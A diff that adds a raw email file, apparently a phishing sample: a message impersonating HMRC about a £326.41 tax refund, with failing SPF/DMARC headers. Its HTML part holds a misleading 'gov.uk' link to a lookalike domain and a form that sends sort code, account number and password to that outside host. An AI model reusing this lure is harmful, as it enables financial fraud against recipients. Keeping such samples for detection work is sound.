@@ -1,0 +1,64 @@
+Return-Path: <noreply@hmrc-tax-refund.xyz>
+Received: from hmrc-tax-refund.xyz (unknown [185.193.127.14])
+	by mx1.corp.co.uk with ESMTPS
+	for <user@corp.co.uk>; Mon, 14 Apr 2025 10:15:32 +0100
+Received: from mail.hmrc-tax-refund.xyz (localhost [127.0.0.1])
+	by hmrc-tax-refund.xyz (Postfix) with ESMTP id 0ABCD1234;
+	Mon, 14 Apr 2025 11:15:28 +0200 (CEST)
+Authentication-Results: mx1.corp.co.uk;
+	spf=fail (sender IP is 185.193.127.14) smtp.mailfrom=hmrc-tax-refund.xyz;
+	dkim=none (message not signed);
+	dmarc=fail action=none header.from=gov.uk;
+Message-ID: <20250414101528.0ABCD1234@hmrc-tax-refund.xyz>
+Date: Mon, 14 Apr 2025 10:15:28 +0100
+From: "HM Revenue & Customs" <noreply@hmrc-tax-refund.xyz>
+Reply-To: <claims@secure-refund-portal.top>
+To: user@corp.co.uk
+Subject: You have a pending tax refund of £326.41 — action required within 24 hours
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="boundary-xyz"
+
+--boundary-xyz
+Content-Type: text/plain; charset=UTF-8
+
+Dear Customer,
+
+HM Revenue and Customs has completed a recalculation of your tax contributions
+for the 2024–25 year. You have been identified as eligible for a tax refund
+of £326.41.
+
+To claim your refund, please confirm your identity and banking details at:
+https://hmrc-tax-refund.xyz/claim?id=7821
+
+Please note this claim must be submitted within 24 hours. Failure to do so
+will result in the refund being cancelled and returned to the Treasury.
+
+Kindly do not reply to this email. This is an automated notification from
+HM Revenue & Customs.
+
+Regards,
+HMRC Refund Department
+
+--boundary-xyz
+Content-Type: text/html; charset=UTF-8
+
+<html><body style="font-family:Arial,sans-serif">
+<p>Dear Customer,</p>
+<p>HM Revenue and Customs has completed a recalculation of your tax
+contributions for the 2024&#8211;25 year. You have been identified as eligible
+for a tax refund of <strong>&pound;326.41</strong>.</p>
+<p>To claim your refund, please
+<a href="https://hmrc-tax-refund.xyz/claim?id=7821">click here to verify your
+details on gov.uk</a>.</p>
+<p>Please note this claim must be submitted within 24 hours. Failure to do so
+will result in the refund being cancelled.</p>
+<form action="https://hmrc-tax-refund.xyz/claim" method="post">
+  Sort code: <input type="text" name="sc"><br>
+  Account number: <input type="text" name="an"><br>
+  Password: <input type="password" name="pw"><br>
+  <button type="submit">Claim refund</button>
+</form>
+<p>Regards,<br>HMRC Refund Department</p>
+</body></html>
+
+--boundary-xyz--
